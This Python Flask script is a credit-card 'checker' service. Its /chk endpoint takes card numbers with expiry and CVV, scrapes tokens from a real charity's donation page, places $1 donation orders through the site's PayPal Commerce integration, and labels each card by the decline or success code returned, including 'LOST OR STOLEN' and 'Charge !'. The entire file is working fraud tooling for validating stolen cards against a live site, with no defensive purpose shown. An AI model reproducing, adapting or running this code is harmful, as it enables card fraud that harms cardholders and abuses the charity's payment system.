from flask import Flask, request, jsonify
from concurrent.futures import ThreadPoolExecutor
import requests,base64
r=requests.Session()
import re
import time
import subprocess
from user_agent import *
user=generate_user_agent()
from requests_toolbelt.multipart.encoder import MultipartEncoder
def drgam(ccx):#@I_PNP
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3].strip()
	if "20" in yy:
		yy = yy.split("20")[1]	
		
	headers = {
	    'user-agent': user,
	}
	            

    

	
	response = r.get(f'https://sfts.org.uk/donate/', cookies=r.cookies, headers=headers)
	id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
	id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
	nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
	
	
	enc = re.search(r'"data-client-token":"(.*?)"',response.text).group(1)
	dec = base64.b64decode(enc).decode('utf-8')
	au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
	#Drgam
	headers = {
	    'origin': f'https://sfts.org.uk',
	    'referer': f'https://sfts.org.uk/donate/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'give-honeypot': '',
	    'give-form-id-prefix': id_form1,
	    'give-form-id': id_form2,
	    'give-form-title': '',
	    'give-current-url': f'https://sfts.org.uk/donate/',
	    'give-form-url': f'https://sfts.org.uk/donate/',
	    'give-form-minimum': '1.00',
	    'give-form-maximum': '999999.99',
	    'give-form-hash': nonec,
	    'give-price-id': '3',
	    'give-recurring-logged-in-only': '',
	    'give-logged-in-only': '1',
	    '_give_is_donation_recurring': '0',
	    'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
	    'give-amount': '1.00',
	    'give_stripe_payment_method': '',
	    'payment-mode': 'paypal-commerce',
	    'give_first': 'DRGAM',
	    'give_last': 'rights and',
	    'give_email': 'drgam22@gmail.com',
	    'card_name': 'drgam ',
	    'card_exp_month': '',
	    'card_exp_year': '',
	    'give_action': 'purchase',
	    'give-gateway': 'paypal-commerce',
	    'action': 'give_process_donation',
	    'give_ajax': 'true',
	}
	
	response = r.post(f'https://sfts.org.uk/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
	data = MultipartEncoder({
    'give-honeypot': (None, ''),
    'give-form-id-prefix': (None, id_form1),
    'give-form-id': (None, id_form2),
    'give-form-title': (None, ''),
    'give-current-url': (None, f'https://sfts.org.uk/donate/'),
    'give-form-url': (None, f'https://sfts.org.uk/donate/'),
    'give-form-minimum': (None, '1.00'),
    'give-form-maximum': (None, '999999.99'),
    'give-form-hash': (None, nonec),
    'give-price-id': (None, '3'),
    'give-recurring-logged-in-only': (None, ''),
    'give-logged-in-only': (None, '1'),
    '_give_is_donation_recurring': (None, '0'),
    'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
    'give-amount': (None, '1.00'),
    'give_stripe_payment_method': (None, ''),
    'payment-mode': (None, 'paypal-commerce'),
    'give_first': (None, 'DRGAM'),
    'give_last': (None, 'rights and'),
    'give_email': (None, 'drgam22@gmail.com'),
    'card_name': (None, 'drgam '),
    'card_exp_month': (None, ''),
    'card_exp_year': (None, ''),
    'give-gateway': (None, 'paypal-commerce'),
})
#I_PNP
	headers = {
	    
	    'content-type': data.content_type,
	    # 'cookie': '_gcl_au=1.1.962826774.1767951207; _ga=GA1.2.1786610370.1767951209; _gid=GA1.2.1096492893.1767951209; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-09%2009%3A33%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fipconfederation.org%2Fdonate%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-01-09%2009%3A33%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fipconfederation.org%2Fdonate%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; tk_ai=a1/ttKH1lhf3VcOEKOThDTX1; __stripe_mid=8c9ea608-2e3a-4061-8399-5cdfd855d0fd56876d; __stripe_sid=ebf223cb-e512-4f91-8f87-6d69206a93c902ff13; _ga_WV5WJRZP4D=GS2.2.s1767951211$o1$g1$t1767951369$j60$l0$h0; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fipconfederation.org%2Fdonate%2F',
	    'origin': f'https://sfts.org.uk',
	    'referer': f'https://sfts.org.uk/donate/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}
	
	
	params = {
	    'action': 'give_paypal_commerce_create_order',
	}
	
	response = r.post(
	    f'https://sfts.org.uk/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=r.cookies,
	    headers=headers,
	    data=data
	)
	tok = (response.json()['data']['id'])
	
	
	headers = {
	    'authority': 'cors.api.paypal.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
	    'authorization': f'Bearer {au}',
	    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'payment_source': {
	        'card': {
	            'number': n,
	            'expiry': f'20{yy}-{mm}',
	            'security_code': cvc,
	            'attributes': {
	                'verification': {
	                    'method': 'SCA_WHEN_REQUIRED',
	                },
	            },
	        },
	    },
	    'application_context': {
	        'vault': False,
	    },
	}
	
	response = r.post(
	    f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
	    headers=headers,
	    json=json_data,
	)
		
	data = MultipartEncoder({
	    'give-honeypot': (None, ''),
	    'give-form-id-prefix': (None, id_form1),
	    'give-form-id': (None, id_form2),
	    'give-form-title': (None, ''),
	    'give-current-url': (None, f'https://sfts.org.uk/donate/'),
	    'give-form-url': (None, f'https://sfts.org.uk/donate/'),
	    'give-form-minimum': (None, '1.00'),
	    'give-form-maximum': (None, '999999.99'),
	    'give-form-hash': (None, nonec),
	    'give-price-id': (None, '3'),
	    'give-recurring-logged-in-only': (None, ''),
	    'give-logged-in-only': (None, '1'),
	    '_give_is_donation_recurring': (None, '0'),
	    'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
	    'give-amount': (None, '1.00'),
	    'give_stripe_payment_method': (None, ''),
	    'payment-mode': (None, 'paypal-commerce'),
	    'give_first': (None, 'DRGAM'),
	    'give_last': (None, 'rights and'),
	    'give_email': (None, 'drgam22@gmail.com'),
	    'card_name': (None, 'drgam '),
	    'card_exp_month': (None, ''),
	    'card_exp_year': (None, ''),
	    'give-gateway': (None, 'paypal-commerce'),
	})
	headers = {
	    'content-type': data.content_type,
	    # 'cookie': '_gcl_au=1.1.962826774.1767951207; _ga=GA1.2.1786610370.1767951209; _gid=GA1.2.1096492893.1767951209; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-09%2009%3A33%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fipconfederation.org%2Fdonate%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-01-09%2009%3A33%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fipconfederation.org%2Fdonate%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; tk_ai=a1/ttKH1lhf3VcOEKOThDTX1; __stripe_mid=8c9ea608-2e3a-4061-8399-5cdfd855d0fd56876d; __stripe_sid=ebf223cb-e512-4f91-8f87-6d69206a93c902ff13; _ga_WV5WJRZP4D=GS2.2.s1767951211$o1$g1$t1767951369$j60$l0$h0; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fipconfederation.org%2Fdonate%2F',
	    'origin': f'https://sfts.org.uk',
	    'referer': f'https://sfts.org.uk/donate/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}
	
	params = {
	    'action': 'give_paypal_commerce_approve_order',
	    'order': tok,
	}
	
	response = r.post(
	    f'https://sfts.org.uk/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=r.cookies,
	    headers=headers,
	    data=data
	)
#Drgam
#@I_PNP	
	text = response.text
	if 'true' in text or 'sucsess' in text:    
		return "Charge !"
	elif 'DO_NOT_HONOR' in text:
		return "Do not honor"
	elif 'ACCOUNT_CLOSED' in text:
		return "Account closed"
	elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
		return "Account closed"
	elif 'LOST_OR_STOLEN' in text:
		return "LOST OR STOLEN"
	elif 'CVV2_FAILURE' in text:
		return "Card Issuer Declined CVV"
	elif 'SUSPECTED_FRAUD' in text:
		return "SUSPECTED FRAUD"
	elif 'INVALID_ACCOUNT' in text:
		return 'INVALID_ACCOUNT'
	elif 'REATTEMPT_NOT_PERMITTED' in text:
		return "REATTEMPT NOT PERMITTED"
	elif 'ACCOUNT BLOCKED BY ISSUER' in text:
		return "ACCOUNT_BLOCKED_BY_ISSUER"
	elif 'ORDER_NOT_APPROVED' in text:
		return 'ORDER_NOT_APPROVED'
	elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
		return 'PICKUP_CARD_SPECIAL_CONDITIONS'
	elif 'PAYER_CANNOT_PAY' in text:
		return "PAYER CANNOT PAY"
	elif 'INSUFFICIENT_FUNDS' in text:
		return 'Insufficient Funds'
	elif 'GENERIC_DECLINE' in text:
		return 'GENERIC_DECLINE'
	elif 'COMPLIANCE_VIOLATION' in text:
		return "COMPLIANCE VIOLATION"
	elif 'TRANSACTION_NOT PERMITTED' in text:
		return "TRANSACTION NOT PERMITTED"
	elif 'PAYMENT_DENIED' in text:
		return 'PAYMENT_DENIED'
	elif 'INVALID_TRANSACTION' in text:
		return "INVALID TRANSACTION"
	elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
		return "RESTRICTED OR INACTIVE ACCOUNT"
	elif 'SECURITY_VIOLATION' in text:
		return 'SECURITY_VIOLATION'
	elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
		return "DECLINED DUE TO UPDATED ACCOUNT"
	elif 'INVALID_OR_RESTRICTED_CARD' in text:
		return "INVALID CARD"
	elif 'EXPIRED_CARD' in text:
		return "EXPIRED CARD"
	elif 'CRYPTOGRAPHIC_FAILURE' in text:
		return "CRYPTOGRAPHIC FAILURE"
	elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
		return "TRANSACTION CANNOT BE COMPLETED"
	elif 'DECLINED_PLEASE_RETRY' in text:
		return "DECLINED PLEASE RETRY LATER"
	elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
		return "EXCEED LIMIT"
	else:
		try:
			result = response.json()['data']['error']
			return result
		except:
			return "UNKNOWN_ERROR"
			
			
app = Flask(__name__)
executor = ThreadPoolExecutor(max_workers=10)

@app.route("/chk", methods=["GET"])
def check_card():

    cc = request.args.get("cc")

    if not cc:
        return jsonify({"error": "cc missing"}), 400

    result = drgam(cc)

    return jsonify({
        "card": cc,
        "result": result
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, threaded=True)
